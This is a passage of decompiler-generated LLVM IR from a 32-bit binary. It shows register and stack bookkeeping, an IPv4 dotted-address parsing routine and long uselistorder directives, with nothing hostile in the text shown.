  %v2_1000d93c = add i32 %v1_1000d93c, 20
  %v3_1000d93c = inttoptr i32 %v2_1000d93c to i32*
  store i32 %v4_1000d938, i32* %v3_1000d93c, align 4
  %v0_1000d940 = load i32, i32* @r28, align 4
  %v1_1000d940 = add i32 %v0_1000d940, 16
  %v2_1000d940 = inttoptr i32 %v1_1000d940 to i32*
  %v3_1000d940 = load i32, i32* %v2_1000d940, align 4
  store i32 %v3_1000d940, i32* %r0.global-to-local, align 4
  %v1_1000d944 = load i32, i32* @r29, align 4
  %v2_1000d944 = add i32 %v1_1000d944, 24
  %v3_1000d944 = inttoptr i32 %v2_1000d944 to i32*
  store i32 %v3_1000d940, i32* %v3_1000d944, align 4
  %v0_1000d948 = load i32, i32* @r28, align 4
  %v1_1000d948 = add i32 %v0_1000d948, 20
  %v2_1000d948 = inttoptr i32 %v1_1000d948 to i32*
  %v3_1000d948 = load i32, i32* %v2_1000d948, align 4
  store i32 %v3_1000d948, i32* %r0.global-to-local, align 4
  %v1_1000d94c = load i32, i32* @r29, align 4
  %v2_1000d94c = add i32 %v1_1000d94c, 28
  %v3_1000d94c = inttoptr i32 %v2_1000d94c to i32*
  store i32 %v3_1000d948, i32* %v3_1000d94c, align 4
  %v0_1000d950 = load i32, i32* @r28, align 4
  %v1_1000d950 = add i32 %v0_1000d950, 24
  %v2_1000d950 = inttoptr i32 %v1_1000d950 to i32*
  %v3_1000d950 = load i32, i32* %v2_1000d950, align 4
  store i32 %v3_1000d950, i32* %r0.global-to-local, align 4
  %v0_1000d954 = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d954 = load i32, i32* @r29, align 4
  %v2_1000d954 = add i32 %v1_1000d954, 32
  %v3_1000d954 = inttoptr i32 %v2_1000d954 to i32*
  store i32 %v0_1000d954, i32* %v3_1000d954, align 4
  %v0_1000d958 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000d958 = load i32, i32* @r29, align 4
  %v2_1000d958 = add i32 %v1_1000d958, 36
  %v3_1000d958 = inttoptr i32 %v2_1000d958 to i32*
  store i32 %v0_1000d958, i32* %v3_1000d958, align 4
  %v0_1000d95c = load i32, i32* @r28, align 4
  %v1_1000d95c = add i32 %v0_1000d95c, 28
  %v2_1000d95c = inttoptr i32 %v1_1000d95c to i32*
  %v3_1000d95c = load i32, i32* %v2_1000d95c, align 4
  store i32 %v3_1000d95c, i32* %r0.global-to-local, align 4
  %v1_1000d960 = load i32, i32* @r29, align 4
  %v2_1000d960 = add i32 %v1_1000d960, 44
  %v3_1000d960 = inttoptr i32 %v2_1000d960 to i32*
  store i32 %v3_1000d95c, i32* %v3_1000d960, align 4
  %v0_1000d964 = load i32, i32* @r28, align 4
  %v1_1000d964 = add i32 %v0_1000d964, 32
  %v2_1000d964 = inttoptr i32 %v1_1000d964 to i32*
  %v3_1000d964 = load i32, i32* %v2_1000d964, align 4
  store i32 %v3_1000d964, i32* %r0.global-to-local, align 4
  %v1_1000d968 = load i32, i32* @r29, align 4
  %v2_1000d968 = add i32 %v1_1000d968, 48
  %v3_1000d968 = inttoptr i32 %v2_1000d968 to i32*
  store i32 %v3_1000d964, i32* %v3_1000d968, align 4
  %v0_1000d96c = load i32, i32* @r28, align 4
  %v1_1000d96c = add i32 %v0_1000d96c, 36
  %v2_1000d96c = inttoptr i32 %v1_1000d96c to i32*
  %v3_1000d96c = load i32, i32* %v2_1000d96c, align 4
  store i32 %v3_1000d96c, i32* %r0.global-to-local, align 4
  %v1_1000d970 = load i32, i32* @r29, align 4
  %v2_1000d970 = add i32 %v1_1000d970, 52
  %v3_1000d970 = inttoptr i32 %v2_1000d970 to i32*
  store i32 %v3_1000d96c, i32* %v3_1000d970, align 4
  %v0_1000d974 = load i32, i32* @r28, align 4
  %v1_1000d974 = add i32 %v0_1000d974, 40
  %v2_1000d974 = inttoptr i32 %v1_1000d974 to i32*
  %v3_1000d974 = load i32, i32* %v2_1000d974, align 4
  store i32 %v3_1000d974, i32* %r0.global-to-local, align 4
  %v1_1000d978 = load i32, i32* @r29, align 4
  %v2_1000d978 = add i32 %v1_1000d978, 56
  %v3_1000d978 = inttoptr i32 %v2_1000d978 to i32*
  store i32 %v3_1000d974, i32* %v3_1000d978, align 4
  %v0_1000d97c = load i32, i32* @r28, align 4
  %v1_1000d97c = add i32 %v0_1000d97c, 48
  %v2_1000d97c = inttoptr i32 %v1_1000d97c to i32*
  %v3_1000d97c = load i32, i32* %v2_1000d97c, align 4
  store i32 %v3_1000d97c, i32* %r0.global-to-local, align 4
  %v1_1000d980 = load i32, i32* @r29, align 4
  %v2_1000d980 = add i32 %v1_1000d980, 64
  %v3_1000d980 = inttoptr i32 %v2_1000d980 to i32*
  store i32 %v3_1000d97c, i32* %v3_1000d980, align 4
  %v0_1000d984 = load i32, i32* @r28, align 4
  %v1_1000d984 = add i32 %v0_1000d984, 56
  %v2_1000d984 = inttoptr i32 %v1_1000d984 to i32*
  %v3_1000d984 = load i32, i32* %v2_1000d984, align 4
  %v1_1000d988 = load i32, i32* @r29, align 4
  %v2_1000d988 = add i32 %v1_1000d988, 72
  %v3_1000d988 = inttoptr i32 %v2_1000d988 to i32*
  store i32 %v3_1000d984, i32* %v3_1000d988, align 4
  store i32 %v0_1000d8f4, i32* %r0.global-to-local, align 4
  ret i32 %v3_1000d914

; uselistorder directives
  uselistorder i32 72, { 2, 0, 1 }
  uselistorder i32 64, { 17, 13, 14, 2, 21, 12, 19, 0, 1, 20, 15, 16, 3, 4, 18, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 56, { 3, 4, 0, 1, 2, 14, 15, 16, 17, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 40, { 9, 0, 4, 1, 26, 10, 3, 2, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 6, 27, 7, 28, 5, 29, 30, 8, 31 }
  uselistorder i32 52, { 4, 1, 2, 3, 5, 6, 0, 7 }
  uselistorder i32 48, { 6, 7, 3, 4, 8, 0, 10, 1, 2, 5, 9 }
  uselistorder i32 36, { 6, 7, 3, 4, 5, 1, 8, 2, 9, 10, 11, 12, 13, 0, 14 }
  uselistorder i32 24, { 7, 8, 4, 5, 1, 2, 6, 77, 78, 79, 80, 81, 82, 66, 67, 68, 69, 70, 72, 73, 74, 75, 71, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 76, 3, 83, 84, 85, 0 }
  uselistorder i32 20, { 20, 21, 16, 17, 18, 19, 22, 23, 24, 25, 6, 88, 0, 1, 89, 2, 90, 26, 7, 27, 28, 29, 30, 31, 8, 32, 33, 34, 35, 36, 37, 38, 39, 9, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 10, 54, 55, 56, 57, 58, 59, 60, 61, 11, 62, 63, 64, 65, 66, 67, 12, 68, 69, 70, 71, 72, 73, 74, 13, 75, 76, 77, 78, 79, 80, 81, 82, 3, 14, 83, 84, 85, 4, 15, 86, 87, 91, 92, 93, 94, 95, 96, 5 }
  uselistorder i32 16, { 77, 78, 67, 68, 79, 80, 81, 82, 83, 20, 76, 72, 175, 176, 84, 85, 47, 48, 49, 69, 50, 51, 70, 71, 165, 166, 153, 52, 23, 155, 24, 156, 162, 18, 0, 19, 1, 2, 163, 3, 154, 75, 53, 73, 74, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 25, 157, 158, 159, 160, 161, 4, 26, 86, 5, 6, 87, 88, 89, 27, 90, 91, 92, 93, 94, 95, 96, 28, 97, 98, 99, 30, 100, 29, 101, 32, 102, 31, 103, 104, 34, 105, 106, 7, 107, 108, 109, 33, 110, 111, 36, 112, 113, 114, 115, 116, 35, 40, 117, 118, 119, 8, 120, 121, 9, 10, 21, 123, 122, 37, 39, 38, 44, 124, 125, 126, 11, 127, 128, 12, 13, 22, 130, 129, 41, 43, 42, 131, 132, 14, 133, 45, 134, 135, 136, 15, 137, 140, 141, 138, 139, 142, 143, 16, 144, 46, 145, 146, 147, 17, 148, 151, 152, 149, 150, 164, 66, 167, 168, 169, 170, 171, 172, 173, 174 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @function_1000d9a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_1000d9a0:
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 268491196, i32* @lr, align 4
  %v0_1000d9b8 = call i32 @function_1000bb50()
  %v0_1000d9c0 = load i32, i32* @r28, align 4
  %v1_1000d9c0 = load i32, i32* @r29, align 4
  %v2_1000d9c0 = add i32 %v1_1000d9c0, %v0_1000d9c0
  ret i32 %v2_1000d9c0

; uselistorder directives
  uselistorder i32* @r28, { 15, 16, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 1, 51, 52, 53, 54, 55, 56, 348, 349, 350, 351, 352, 2, 29, 30, 31, 10, 32, 251, 252, 253, 254, 255, 256, 257, 258, 259, 321, 322, 323, 334, 17, 18, 19, 20, 21, 57, 58, 11, 12, 13, 14, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 4, 278, 3, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 317, 318, 319, 320, 311, 5, 312, 313, 314, 315, 316, 6, 27, 22, 0, 23, 24, 25, 26, 28, 33, 34, 35, 36, 59, 60, 61, 62, 63, 64, 65, 7, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 112, 113, 110, 111, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 129, 130, 127, 128, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 326, 324, 325, 327, 328, 9, 329, 330, 331, 332, 333, 8, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347 }
}

define i32 @function_1000d9d4(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000d9d4:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000d9d4 = icmp eq i8* %arg1, null
  br i1 %v3_1000d9d4, label %dec_label_pc_1000da8c, label %dec_label_pc_1000d9dc

dec_label_pc_1000d9dc:                            ; preds = %dec_label_pc_1000d9d4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000d9f0.pre = load i32, i32* bitcast (i32** @global_var_1001eb0c.506 to i32*), align 4
  br label %dec_label_pc_1000d9ec

dec_label_pc_1000d9ec:                            ; preds = %dec_label_pc_1000d9dc, %dec_label_pc_1000da64
  %v0_1000da64 = phi i32 [ 0, %dec_label_pc_1000d9dc ], [ %v2_1000da6c, %dec_label_pc_1000da64 ]
  %v0_1000da68 = phi i32 [ 1, %dec_label_pc_1000d9dc ], [ %v1_1000da68, %dec_label_pc_1000da64 ]
  %v0_1000d9ec = phi i32 [ %tmp, %dec_label_pc_1000d9dc ], [ %v0_1000d9ec3, %dec_label_pc_1000da64 ]
  %v1_1000d9ec = inttoptr i32 %v0_1000d9ec to i8*
  %v2_1000d9ec = load i8, i8* %v1_1000d9ec, align 1
  %v3_1000d9ec = zext i8 %v2_1000d9ec to i32
  %v1_1000d9f4 = mul nuw nsw i32 %v3_1000d9ec, 2
  %v2_1000d9f8 = add i32 %v1_1000d9f4, %v3_1000d9f0.pre
  %v3_1000d9f8 = inttoptr i32 %v2_1000d9f8 to i16*
  %v4_1000d9f8 = load i16, i16* %v3_1000d9f8, align 2
  %v1_1000d9fc = and i16 %v4_1000d9f8, 8
  %v3_1000d9fc = icmp eq i16 %v1_1000d9fc, 0
  br i1 %v3_1000d9fc, label %dec_label_pc_1000da8c, label %dec_label_pc_1000da04

dec_label_pc_1000da04:                            ; preds = %dec_label_pc_1000d9ec
  br label %dec_label_pc_1000da1c

dec_label_pc_1000da0c:                            ; preds = %dec_label_pc_1000da1c
  %v1_1000da20 = mul i32 %v1_1000da6c, 10
  %v2_1000da28 = add i32 %v3_1000da1c, %v1_1000da20
  %v1_1000da0c = add i32 %v2_1000da28, -48
  %v1_1000da10 = add i32 %v0_1000da54, 1
  %v2_1000da14 = icmp sgt i32 %v1_1000da0c, 255
  br i1 %v2_1000da14, label %dec_label_pc_1000da8c, label %dec_label_pc_1000da1c

dec_label_pc_1000da1c:                            ; preds = %dec_label_pc_1000da0c, %dec_label_pc_1000da04
  %v1_1000da6c = phi i32 [ %v1_1000da0c, %dec_label_pc_1000da0c ], [ 0, %dec_label_pc_1000da04 ]
  %v0_1000da54 = phi i32 [ %v1_1000da10, %dec_label_pc_1000da0c ], [ %v0_1000d9ec, %dec_label_pc_1000da04 ]
  %v1_1000da1c = inttoptr i32 %v0_1000da54 to i8*
  %v2_1000da1c = load i8, i8* %v1_1000da1c, align 1
  %v3_1000da1c = zext i8 %v2_1000da1c to i32
  %v1_1000da24 = mul nuw nsw i32 %v3_1000da1c, 2
  %v2_1000da2c = add i32 %v1_1000da24, %v3_1000d9f0.pre
  %v3_1000da2c = inttoptr i32 %v2_1000da2c to i16*
  %v4_1000da2c = load i16, i16* %v3_1000da2c, align 2
  %v5_1000da2c = zext i16 %v4_1000da2c to i32
  %v1_1000da30 = and i32 %v5_1000da2c, 8
  %v3_1000da30 = icmp eq i32 %v1_1000da30, 0
  br i1 %v3_1000da30, label %dec_label_pc_1000da38, label %dec_label_pc_1000da0c

dec_label_pc_1000da38:                            ; preds = %dec_label_pc_1000da1c
  %v2_1000da38 = icmp sgt i32 %v0_1000da68, 3
  br i1 %v2_1000da38, label %dec_label_pc_1000da50, label %dec_label_pc_1000da40

dec_label_pc_1000da40:                            ; preds = %dec_label_pc_1000da38
  %v3_1000da40 = icmp eq i8 %v2_1000da1c, 46
  br i1 %v3_1000da40, label %dec_label_pc_1000da48, label %dec_label_pc_1000da8c

dec_label_pc_1000da48:                            ; preds = %dec_label_pc_1000da40
  %v1_1000da48 = add i32 %v0_1000da54, 1
  br label %dec_label_pc_1000da64

dec_label_pc_1000da50:                            ; preds = %dec_label_pc_1000da38
  %v3_1000da50 = icmp eq i8 %v2_1000da1c, 0
  %v1_1000da54 = add i32 %v0_1000da54, 1
  br i1 %v3_1000da50, label %dec_label_pc_1000da64, label %dec_label_pc_1000da5c

dec_label_pc_1000da5c:                            ; preds = %dec_label_pc_1000da50
  %v1_1000da5c = and i32 %v5_1000da2c, 32
  %v3_1000da5c = icmp eq i32 %v1_1000da5c, 0
  br i1 %v3_1000da5c, label %dec_label_pc_1000da8c, label %dec_label_pc_1000da64

dec_label_pc_1000da64:                            ; preds = %dec_label_pc_1000da5c, %dec_label_pc_1000da50, %dec_label_pc_1000da48
  %v0_1000d9ec3 = phi i32 [ %v1_1000da54, %dec_label_pc_1000da5c ], [ %v1_1000da54, %dec_label_pc_1000da50 ], [ %v1_1000da48, %dec_label_pc_1000da48 ]
  %v1_1000da64 = mul i32 %v0_1000da64, 256
  %v1_1000da68 = add nuw nsw i32 %v0_1000da68, 1
  %v2_1000da6c = or i32 %v1_1000da6c, %v1_1000da64
  store i32 %v2_1000da6c, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000da68, 5
  br i1 %tmp10, label %dec_label_pc_1000d9ec, label %dec_label_pc_1000da78

dec_label_pc_1000da78:                            ; preds = %dec_label_pc_1000da64
  %v0_1000da78 = load i32, i32* @r4, align 4
  %v3_1000da78 = icmp eq i32 %v0_1000da78, 0
  %v0_1000da80 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000da78, i32 %v0_1000da80)
  %v0_1000da84 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000da84 = load i32, i32* @r4, align 4
  %v2_1000da84 = inttoptr i32 %v1_1000da84 to i32*
  store i32 %v0_1000da84, i32* %v2_1000da84, align 4
  ret i32 1

dec_label_pc_1000da8c:                            ; preds = %dec_label_pc_1000da40, %dec_label_pc_1000da5c, %dec_label_pc_1000d9ec, %dec_label_pc_1000da0c, %dec_label_pc_1000d9d4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000da6c, { 1, 0 }
  uselistorder i32 %v1_1000da68, { 1, 0 }
  uselistorder i32 %v0_1000da54, { 0, 1, 3, 2 }
  uselistorder i32 5, { 21, 3, 22, 23, 42, 61, 1, 24, 25, 26, 27, 28, 29, 30, 4, 5, 62, 0, 43, 44, 2, 45, 31, 32, 33, 34, 35, 46, 6, 8, 47, 7, 48, 11, 49, 10, 50, 9, 36, 51, 12, 14, 52, 37, 53, 13, 38, 54, 15, 39, 55, 16, 40, 56, 18, 57, 17, 41, 58, 20, 59, 19, 60, 63, 64, 65, 66, 67 }
  uselistorder i8 0, { 4, 12, 13, 8, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 24, 25, 26, 27, 28, 30, 32, 29, 1, 31, 2, 33, 34, 5, 9, 35, 36, 37, 38, 39, 40, 41, 42, 3, 43, 44, 45, 46, 6, 47, 48, 49, 50, 52, 53, 54, 55, 51, 58, 66, 67, 59, 60, 61, 62, 56, 57, 11, 63, 64, 65, 10, 7, 68, 69, 70, 71, 72, 73, 74 }
  uselistorder i8 46, { 1, 2, 3, 0 }
  uselistorder i32 8, { 118, 57, 45, 46, 58, 59, 60, 61, 62, 63, 189, 192, 11, 187, 188, 13, 136, 135, 133, 134, 119, 120, 121, 137, 138, 139, 127, 128, 129, 3, 51, 52, 53, 4, 193, 5, 6, 190, 191, 64, 65, 66, 67, 140, 141, 34, 35, 47, 36, 37, 48, 38, 39, 49, 50, 7, 8, 9, 122, 123, 124, 17, 126, 125, 54, 55, 56, 18, 68, 69, 70, 71, 12, 72, 19, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 40, 85, 86, 87, 88, 89, 90, 91, 92, 41, 93, 94, 95, 96, 97, 98, 99, 100, 101, 14, 102, 103, 104, 105, 15, 20, 106, 21, 107, 22, 108, 23, 109, 24, 110, 25, 111, 26, 112, 27, 113, 28, 114, 29, 115, 30, 116, 31, 117, 0, 1, 10, 130, 131, 42, 132, 2, 142, 143, 144, 145, 43, 146, 147, 148, 149, 150, 151, 44, 152, 153, 154, 155, 156, 157, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 158, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 32, 182, 16, 183, 184, 185, 186, 33 }
  uselistorder i32 -48, { 1, 0, 2 }
  uselistorder i32 10, { 74, 37, 13, 36, 3, 4, 7, 6, 0, 14, 15, 16, 29, 17, 18, 30, 19, 20, 31, 32, 75, 76, 77, 78, 79, 21, 80, 81, 82, 8, 83, 35, 33, 5, 34, 2, 1, 22, 23, 24, 25, 9, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 10, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 26, 84, 85, 86, 87, 27, 88, 28, 11, 89, 12, 90 }
  uselistorder i16 0, { 0, 1, 2, 4, 5, 6, 7, 8, 3, 9, 10, 11 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000da8c, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000d9ec, { 1, 0 }
}

define i32 @function_1000da94(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000da94:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_1000da98 = load i32, i32* @lr, align 4
  store i32 %v0_1000da98, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_1000daa4 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* @r30, align 4
  store i32 %arg1, i32* @r29, align 4
  %v1_1000dab4 = add i32 %tmp, 4
  store i32 %v1_1000dab4, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_1000dabc = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_1000dabc, i32* @r3, align 4
  br i1 %v3_1000daa4, label %dec_label_pc_1000dae4, label %dec_label_pc_1000dac4

dec_label_pc_1000dac4:                            ; preds = %dec_label_pc_1000da94
  %v2_1000dac4 = load i32, i32* %arg2, align 4
  store i32 %v2_1000dac4, i32* %r0.global-to-local, align 4
  store i32 268491472, i32* @lr, align 4
  %v0_1000dacc = call i32 @function_1000bb50()
  %v0_1000dad0 = load i32, i32* @r31, align 4
  %v1_1000dad0 = add i32 %v0_1000dad0, 132
  %v2_1000dad0 = inttoptr i32 %v1_1000dad0 to i32*
  %v3_1000dad0 = load i32, i32* %v2_1000dad0, align 4
  store i32 %v3_1000dad0, i32* %r0.global-to-local, align 4
  %v1_1000dadc = add i32 %v0_1000dad0, 136
  %v2_1000dadc = inttoptr i32 %v1_1000dadc to i32*
  %v3_1000dadc = load i32, i32* %v2_1000dadc, align 4
  store i32 %v3_1000dadc, i32* %r0.global-to-local, align 4
  %v0_1000dae4.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000dae4

dec_label_pc_1000dae4:                            ; preds = %dec_label_pc_1000da94, %dec_label_pc_1000dac4
  %v0_1000dae4 = phi i32 [ %arg3, %dec_label_pc_1000da94 ], [ %v0_1000dae4.pre, %dec_label_pc_1000dac4 ]
  %v3_1000dae4 = icmp eq i32 %v0_1000dae4, 0
  %v2_1000dafc = ptrtoint i32* %stack_var_-172 to i32
  %.v2_1000dafc = select i1 %v3_1000dae4, i32 0, i32 %v2_1000dafc
  store i32 %.v2_1000dafc, i32* @r5, align 4
  store i32 268491524, i32* @lr, align 4
  %v0_1000db00 = call i32 @function_1000dcf8()
  %v0_1000db04 = load i32, i32* @r30, align 4
  %v3_1000db04 = icmp eq i32 %v0_1000db04, 0
  store i32 %v0_1000db00, i32* @r31, align 4
  br i1 %v3_1000db04, label %dec_label_pc_1000db40, label %dec_label_pc_1000db14

dec_label_pc_1000db14:                            ; preds = %dec_label_pc_1000dae4
  %v1_1000db0c = icmp slt i32 %v0_1000db00, 0
  %v1_1000db14 = add i32 %v0_1000db04, 4
  store i32 %v1_1000db14, i32* @r3, align 4
  %v2_1000db18 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_1000db18, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1000db0c, label %dec_label_pc_1000db40, label %dec_label_pc_1000db24

dec_label_pc_1000db24:                            ; preds = %dec_label_pc_1000db14
  %v3_1000db24 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_1000db24, i32* %r0.global-to-local, align 4
  %v2_1000db28 = inttoptr i32 %v0_1000db04 to i32*
  store i32 %v3_1000db24, i32* %v2_1000db28, align 4
  store i32 268491568, i32* @lr, align 4
  %v0_1000db2c = call i32 @function_1000bb50()
  %v1_1000db38 = load i32, i32* @r30, align 4
  %v2_1000db38 = add i32 %v1_1000db38, 136
  %v3_1000db38 = inttoptr i32 %v2_1000db38 to i32*
  %v0_1000db3c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000db3c = load i32, i32* @r30, align 4
  %v2_1000db3c = add i32 %v1_1000db3c, 132
  %v3_1000db3c = inttoptr i32 %v2_1000db3c to i32*
  store i32 %v0_1000db3c, i32* %v3_1000db3c, align 4
  %v0_1000db44.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000db40

dec_label_pc_1000db40:                            ; preds = %dec_label_pc_1000db14, %dec_label_pc_1000dae4, %dec_label_pc_1000db24
  %v0_1000db44 = phi i32 [ %v0_1000db00, %dec_label_pc_1000db14 ], [ %v0_1000db00, %dec_label_pc_1000dae4 ], [ %v0_1000db44.pre, %dec_label_pc_1000db24 ]
  store i32 %v0_1000da98, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000db44

; uselistorder directives
  uselistorder i32 %v0_1000db00, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 4, 5, 6, 2 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 ()* @function_1000bb50, { 2, 1, 8, 6, 0, 3, 4, 9, 5, 7 }
  uselistorder i32* @r5, { 25, 0, 26, 3, 13, 14, 15, 34, 20, 8, 9, 35, 36, 37, 38, 6, 29, 30, 1, 31, 32, 33, 16, 7, 27, 28, 2, 5, 4, 17, 21, 22, 23, 24, 19, 10, 11, 12, 18 }
  uselistorder i32 128, { 13, 14, 2, 7, 8, 9, 11, 10, 12, 3, 0, 1, 4, 5, 6 }
  uselistorder i32* @r30, { 230, 231, 232, 0, 233, 1, 151, 2, 39, 40, 41, 234, 237, 235, 236, 152, 153, 154, 129, 130, 131, 132, 133, 155, 156, 160, 157, 158, 159, 7, 8, 9, 10, 11, 12, 13, 3, 14, 134, 135, 136, 143, 137, 138, 139, 4, 140, 141, 142, 20, 21, 22, 23, 24, 25, 26, 27, 28, 15, 16, 17, 18, 19, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 43, 44, 45, 46, 47, 48, 5, 49, 50, 6, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 144, 146, 147, 145, 148, 149, 150, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 205, 202, 203, 204, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 226, 227, 225, 228, 229 }
  uselistorder i32* null, { 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 1, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 44, 31, 32, 45, 33, 34, 35, 36, 2, 37, 38, 39, 40, 3, 41, 42, 4, 43, 5, 26, 27, 28, 29, 30 }
  uselistorder i32* @r31, { 2, 340, 341, 342, 278, 3, 279, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 349, 350, 343, 15, 344, 345, 346, 347, 348, 53, 54, 280, 281, 282, 283, 284, 285, 243, 244, 245, 246, 247, 248, 249, 250, 268, 269, 286, 290, 287, 288, 289, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 79, 4, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 251, 252, 253, 254, 94, 95, 96, 97, 98, 264, 265, 266, 255, 256, 257, 258, 259, 260, 261, 262, 263, 42, 43, 0, 44, 5, 45, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 46, 47, 48, 49, 50, 51, 52, 6, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 99, 100, 101, 102, 103, 104, 105, 106, 107, 1, 7, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 267, 8, 270, 271, 272, 273, 274, 275, 276, 277, 13, 291, 292, 293, 294, 9, 298, 299, 300, 301, 295, 296, 297, 302, 303, 304, 305, 306, 307, 308, 309, 14, 310, 311, 11, 312, 313, 314, 315, 316, 318, 10, 317, 319, 320, 321, 322, 323, 324, 